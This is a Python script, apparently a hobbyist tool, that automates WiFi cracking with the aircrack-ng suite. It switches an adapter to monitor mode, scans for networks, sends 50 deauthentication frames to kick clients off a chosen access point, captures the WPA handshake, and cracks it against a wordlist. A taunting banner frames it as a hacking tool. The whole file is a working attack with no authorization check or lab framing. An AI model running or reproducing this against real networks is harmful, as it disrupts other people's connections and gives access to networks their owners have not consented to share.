import subprocess
import time
import keyboard

def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prRed(skk): print("\033[97m\033[41m{}\033[0m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))


def solo_target():
    bssid_given = input("Copy and Paste the BSSID of the Network\n>>>>")
    ch_given = input("Enter the CH Number of the Network\n>>>")
    command_4 = ["sudo", "airodump-ng", interface_name[5], "-c", ch_given, "--bssid", bssid_given, "-w", "targets/target_wifi"]
    x = subprocess.Popen(command_4)
    time.sleep(5)
    command_5 = ["sudo", "aireplay-ng", "--deauth", "50", "-a", bssid_given, interface_name[5]]
    y=subprocess.run(command_5)
    keyboard.wait("ctrl+c")
    x.terminate()
    x.wait()

def scanner():
    command_3 = "sudo airodump-ng "+interface_name[5]
    prYellow("Scanning has been started... Press Ctrl+C to Stop")
    airodump_process = subprocess.Popen(command_3,shell=True)
    keyboard.wait("ctrl+c")
    airodump_process.terminate()
    airodump_process.wait()     
    time.sleep(1)
    prGreen("Scanning Completed!")
    solo_target()

def clear_screen():
    subprocess.call("clear", shell=True)


clear_screen()
prYellow("..Loading..")    
time.sleep(1)
clear_screen()
prYellow("....Loading....")  
time.sleep(1)
clear_screen()
prYellow("......Loading......")  
time.sleep(1)
clear_screen()
prRed('''
⣿A⣿L⣿P⣿H⣿A⣿B⣿E⣿T⣿9⣿4⣿7⣿0⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠘⢿⡟⢹⠿⠃⢸⡿⠛⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠋⢿⠛⠃⠀⠀⠀⠁⠀⠀⣬⠃⡴⠋⠴⠿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢸⡄⠀⠁⢀⠈⠀⠀⠀⡄⠀⢀⠌⢀⠀⠀⠐⠋⢰⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠎⠃⠀⢔⠄⠀⠆⠀⢠⣁⣄⣤⡞⠁⠀⡀⠀⠀⠉⠛⣻⣿⣿⣿
⣿⣿⣿⡉⠉⠉⠀⠠⢄⣀⠤⠗⠚⡇⡍⠨⡁⠉⠉⠙⢯⠒⠀⠀⠐⠼⣿⣿⣿⣿
⣿⣿⣿⣿⡀⡐⠠⠄⠢⠋⠀⠀⢸⣴⡇⡷⠧⠀⠀⣀⠀⠱⡆⠀⠈⠲⣾⣿⣿⣿
⣿⣟⠛⠛⠉⠀⢀⣴⠃⠀⠀⠤⠬⣀⠁⠃⡰⡪⣕⣒⣀⡀⢹⣿⣖⣿⣿⣿⣿⣿
⣿⣿⣶⡖⣡⡴⢛⣏⠀⡠⠔⢚⡻⡟⢧⣀⠙⠙⣹⣶⣠⣧⡈⣿⠿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⡿⣿⢠⣳⠤⠽⠓⣠⠟⠉⠓⠒⠂⠀⠸⠿⡇⢷⡏⣹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡴⣪⢺⡟⠋⠀⠀⠀⠀⠂⠄⠀⠀⠀⠀⠀⣟⡼⢣⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⡘⠧⡹⡄⠀⠀⣀⠤⢐⣒⣀⣩⡽⠃⢸⣿⣴⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣄⠙⠚⠛⢋⣉⡥⠊⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠪⣷⣤⡴⢶⡄⢰⡞⢛⠟⡝⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢀⡀⠉⠒⠬⠥⠤⠔⡡⣼⠀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠙⣇⠀⠀⢃⠀⢠⠎⠀⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣹⠀⢹⡄⣀⠈⠱⡃⠀⠀⠇⠀⠆⠈⢻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢿⣿⣿⠃⠀⠈⡀⠀⢧⠃⠉⠒⠃⠀⢰⠀⠐⡀⠀⠀⠻⠛⠛⠙⠻
⡿⠿⠛⠋⠁⣚⣋⡁⠀⠀⣰⠁⠀⠈⢳⡀⠀⠀⠀⡄⠀⠀⡷⡀⠀⠀⣿⣿⡧⠀
⠀⠀⠘⠃⢼⡿⢿⣁⣠⡾⢻⣀⡀⠀⠈⢧⡀⠀⣰⠡⠐⠒⠋⠈⠉⠁⠈⢶⣿⣷''')
prGreen("\nMoron.... So you wanna Hack WiFi.")
time.sleep(1)
prRed("Know Your Place Fool...")
time.sleep(1)
command_output = subprocess.getoutput('sudo /usr/sbin/airmon-ng')
interface_name = command_output.split()
user_input = int(input("\nPress (1)  Monitor Mode \nPress (2) for Managed Mode\nPress (3) For Exit\n>>>"))
if user_input == 1:
    command_1 = "sudo airmon-ng start "+interface_name[5]
    subprocess.run(command_1,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
    prGreen("Monitor Mode has been Enabled")
    user_input = int(input("Press (1) For Scan \nPress (2) For Cracking\nPress (3) For Exit\n>>>"))
    if user_input==1:
        scanner()
    elif user_input==2:
        target_cap = input("Enter the last number of the Handshake [e.g: 01]\n>>>")
        command_6 = ["sudo", "aircrack-ng", "-w", "wordlist.txt", f"targets/target_wifi-{target_cap}.cap"]
        subprocess.run(command_6)
    elif user_input==3:
        prYellow("\nExiting the Program!")
    else:
        prRed("Error 404")
elif user_input == 2:
    command_2 = "sudo airmon-ng stop "+interface_name[5]
    subprocess.run(command_2,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
    prGreen("Managed Mode has been Enabled")
elif user_input==3:
    prYellow("\nExiting the Program!")
else:
    prRed("You Tried to be Oversmart \n Exiting the Program")


